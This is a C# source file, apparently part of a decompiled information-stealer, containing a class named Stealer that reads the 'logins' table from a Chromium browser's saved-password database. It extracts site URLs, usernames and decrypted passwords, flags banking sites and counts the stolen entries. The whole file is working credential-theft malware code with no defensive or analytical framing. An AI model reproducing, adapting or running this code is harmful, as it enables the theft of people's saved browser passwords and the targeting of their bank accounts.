using System.Collections.Generic;
using Client.Modules.Passwords.Helpers;

namespace Client.Modules.Passwords.Targets.Browsers.Chromium;

internal sealed class Stealer
{
	public static List<Password> Get(string sLoginData)
	{
		try
		{
			List<Password> list = new List<Password>();
			SQLite sQLite = SqlReader.ReadTable(sLoginData, "logins");
			if (sQLite == null)
			{
				return list;
			}
			for (int i = 0; i < sQLite.GetRowCount(); i++)
			{
				Password item = default(Password);
				item.sUrl = Crypto.GetUTF8(sQLite.GetValue(i, 0));
				item.sUsername = Crypto.GetUTF8(sQLite.GetValue(i, 3));
				string value = sQLite.GetValue(i, 5);
				if (value != null)
				{
					item.sPassword = Crypto.GetUTF8(Crypto.EasyDecrypt(sLoginData, value));
					list.Add(item);
					Banking.ScanData(item.sUrl);
					Counter.Passwords++;
				}
			}
			return list;
		}
		catch
		{
			return new List<Password>();
		}
	}
}
